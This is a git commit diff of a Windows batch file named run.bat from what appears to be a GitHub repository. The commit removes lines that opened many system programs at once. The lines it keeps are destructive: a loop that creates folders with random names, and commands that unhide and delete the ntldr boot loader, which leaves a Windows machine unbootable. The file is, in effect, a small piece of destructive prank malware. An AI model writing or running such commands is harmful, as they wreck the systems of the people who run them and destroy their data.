5939e9e851d7e23695da2453e31eeaa2fe61a386
ilovecodeing123456799 <90834028+ilovecodeing123456799@users.noreply.github.com>
2022-11-19 12:22:42 +0800

    Update run.bat

--- run.bat
+++ run.bat
@@ -6,10 +6,3 @@ MD %RANDOM%
 goto Rookie
 attrib -s -r -h c:\ntldr
 del ntldr
-start %systemroot%\system32\notepad.exe
-start %systemroot%\system32\cmd.exe
-start %systemroot%\system32\control.exe
-start %systemroot%\system32\write.exe
-start %systemroot%\winhlp32.exe
-start %systemroot%\Boot\DVD\PCAT\etfsboot.com
-
